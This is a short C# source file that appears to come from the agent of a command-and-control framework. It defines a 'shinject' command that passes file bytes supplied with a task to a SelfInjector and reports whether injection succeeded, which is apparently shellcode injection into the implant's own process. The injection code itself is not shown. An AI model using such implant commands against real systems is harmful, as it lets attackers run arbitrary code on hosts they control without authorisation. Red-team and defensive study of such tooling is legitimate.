using AgentClient.Application.Services.InjectService;
using AgentClient.Domain.Models.Agents;

namespace AgentClient.Application.Commands
{
    public class SelfInject : AgentCommand
    {
        public override string Name => "shinject";

        public override string Execute(AgentTask task)
        {
            if (task.FileBytes == null)
            {
                return "FileBytes cannot be null";
            }

            var injector = new SelfInjector();
            var success = injector.Inject(task.FileBytes);

            if (success)
            {
                return "Injection successful";
            }
            else
            {
                return "Injection failed";
            }
        }
    }
}
